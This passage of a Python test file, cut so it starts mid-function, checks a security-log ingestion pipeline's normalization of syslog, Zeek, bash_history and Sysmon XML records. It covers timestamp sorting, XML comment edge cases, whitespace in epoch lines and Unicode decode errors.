    ev_mid = Normalizer.normalize(
        ctx, RawRecord(physical_record_id="pr-mid", payload={"ts": 1717063200.05, "conn_state": "SF"})
    )["events"][0]
    ev_exact = Normalizer.normalize(
        ctx, RawRecord(physical_record_id="pr-exact", payload={"ts": 1717063200.0, "conn_state": "SF"})
    )["events"][0]
    ev_offset = Event(
        event_id="evt_offset",
        physical_record_id="pr-offset",
        source_type="syslog",
        event_time="2024-05-30T17:59:59.999999+08:00",  # 09:59:59.999999Z
        fields={"log_source": "syslog", "rfc": "5424", "priority": 34, "facility": 4,
                "facility_name": "auth", "severity": 2, "severity_name": "crit",
                "syslog_version": 1, "hostname": "h", "app_name": "a", "pid": 1,
                "msgid": None, "structured_data": None, "message": "m"},
        parse_metadata={"log_format": "syslog"},
    )
    ev_missing = Event(
        event_id="evt_b_missing",
        physical_record_id="pr-missing",
        source_type="bash_history",
        event_time=None,
        fields={"log_source": "bash_history", "epoch_ts": None, "user": "u", "Image": "id", "command": "id"},
        parse_metadata={"log_format": "bash_history"},
    )
    ev_missing_a = Event(
        event_id="evt_a_missing",
        physical_record_id="pr-missing-a",
        source_type="bash_history",
        event_time=None,
        fields={"log_source": "bash_history", "epoch_ts": None, "user": "u", "Image": "ls", "command": "ls"},
        parse_metadata={"log_format": "bash_history"},
    )

    sorted_recs = format_for_rsigma(
        [ev_later, ev_missing, ev_exact, ev_mid, ev_missing_a, ev_offset],
        sort_utc=True,
    )
    assert [r["raw_id"] for r in sorted_recs] == [
        "pr-offset",
        "pr-exact",
        "pr-mid",
        "pr-later",
        "pr-missing-a",
        "pr-missing",
    ]


def test_winxml_inner_comment_with_closing_event_tag(tmp_path: Path) -> None:
    data_dir = tmp_path / "data"
    (data_dir / "H1").mkdir(parents=True)
    xml_file = data_dir / "H1" / "windows_event_sysmon.xml"
    inner_event = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event" title="a>b">'
        "<System><Provider Name=\"Microsoft-Windows-Sysmon\"/><EventID>10</EventID>"
        '<TimeCreated SystemTime="2024-05-30T10:00:00Z"/>'
        "<Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>"
        "<!-- inner </Event> comment --><!-- second </Event> -->"
        '<EventData><Data Name="TargetImage">lsass.exe</Data></EventData>'
        "</Event>"
    )
    xml_file.write_text(
        "<Events>\n"
        "  <!-- <Event><System><EventID>999</EventID></System></Event> -->\n"
        f"  {inner_event}\n"
        "</Events>\n",
        encoding="utf-8",
    )
    idx_path = tmp_path / "Label_Index.json"
    idx_path.write_text(
        json.dumps({"pr-1": {"filepath": "data/H1/windows_event_sysmon.xml", "linenumber": 1}}),
        encoding="utf-8",
    )
    rows = list(load_indexed_records(idx_path, data_dir))
    assert len(rows) == 1
    assert rows[0][1]["raw_text"] == inner_event

    norm = Normalizer.normalize(_ctx(), RawRecord(physical_record_id="pr-1", payload=rows[0][1]))
    assert norm["gaps"] == []
    assert len(norm["events"]) == 1
    assert norm["events"][0].fields["TargetImage"] == "lsass.exe"
    assert norm["events"][0].fields["EventID"] == 10


def test_bash_history_epoch_trailing_whitespace(tmp_path: Path) -> None:
    data_dir = tmp_path / "data"
    (data_dir / "H1" / "bash_history").mkdir(parents=True)
    bh_file = data_dir / "H1" / "bash_history" / "alice.bash_history"
    bh_file.write_text(
        "#1717000000   \n"
        "whoami\n"
        "#1717000010\t \n"
        "id\n",
        encoding="utf-8",
    )
    idx_path = tmp_path / "Label_Index.json"
    idx_path.write_text(
        json.dumps(
            {
                "pr-1": {"filepath": "data/H1/bash_history/alice.bash_history", "linenumber": 1},
                "pr-2": {"filepath": "data/H1/bash_history/alice.bash_history", "linenumber": 2},
            }
        ),
        encoding="utf-8",
    )
    rows = dict(load_indexed_records(idx_path, data_dir))
    assert rows["pr-1"] == {"raw_text": "whoami", "timestamp": 1717000000}
    assert rows["pr-2"] == {"raw_text": "id", "timestamp": 1717000010}


def test_zeek_custom_filename_runs_fallback_inference() -> None:
    ctx = _ctx(case_id="case-zeek-custom", run_id="run-1")
    sparse_dns = RawRecord(
        physical_record_id="pr-z1",
        locator=Locator(filepath="data/zeek/custom_logs.json", linenumber=1),
        payload={"ts": 1717000000.0, "answers": ["1.2.3.4"]},
    )
    out = Normalizer.normalize(ctx, sparse_dns)
    assert out["gaps"] == []
    assert len(out["events"]) == 1
    assert out["events"][0].source_type == "zeek_dns"

    # Uninferrable custom filename preserves stem fallback
    generic_zeek = RawRecord(
        physical_record_id="pr-z2",
        locator=Locator(filepath="data/zeek/custom_logs.json", linenumber=2),
        payload={"ts": 1717000000.0, "uid": "U1", "proto": "tcp"},
    )
    out2 = Normalizer.normalize(ctx, generic_zeek)
    assert out2["gaps"] == []
    assert out2["events"][0].source_type == "zeek_custom_logs"


def test_store_all_readers_catch_unicode_decode_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    data_dir = tmp_path / "data"
    (data_dir / "H1" / "bash_history").mkdir(parents=True)
    bad_bytes = b"\xff\xfe\xfd\n"

    (data_dir / "H1" / "bad.json").write_bytes(bad_bytes)
    (data_dir / "H1" / "bad.xml").write_bytes(bad_bytes)
    (data_dir / "H1" / "bash_history" / "bad.bash_history").write_text("#1\nwhoami\n", encoding="utf-8")
    (data_dir / "H1" / "bad.log").write_text("ok\n", encoding="utf-8")

    # 1 & 2: real invalid UTF-8 bytes in JSONL and WinXML raise InvalidArgumentError
    for rel in ("data/H1/bad.json", "data/H1/bad.xml"):
        idx = tmp_path / "idx.json"
        idx.write_text(json.dumps({"pr-1": {"filepath": rel, "linenumber": 1}}), encoding="utf-8")
        with pytest.raises(InvalidArgumentError):
            list(load_indexed_records(idx, data_dir))

    # 3 & 4: bash_history and text readers also catch UnicodeDecodeError cleanly
    from apt_agent.ingestion import store as store_mod

    orig_read_text = Path.read_text
    orig_open = Path.open

    def _raise_decode_read_text(self: Path, *args: Any, **kwargs: Any) -> str:
        if self.name == "bad.bash_history":
            raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")
        return orig_read_text(self, *args, **kwargs)

    def _raise_decode_open(self: Path, *args: Any, **kwargs: Any) -> Any:
        if self.name == "bad.log":
            raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")
        return orig_open(self, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", _raise_decode_read_text)
    monkeypatch.setattr(Path, "open", _raise_decode_open)

    with pytest.raises(InvalidArgumentError):
        store_mod._read_bash_history_records(
            data_dir / "H1" / "bash_history" / "bad.bash_history",
            logical_filepath="data/H1/bash_history/bad.bash_history",
        )
    with pytest.raises(InvalidArgumentError):
        store_mod._read_text_records(
            data_dir / "H1" / "bad.log",
            logical_filepath="data/H1/bad.log",
        )


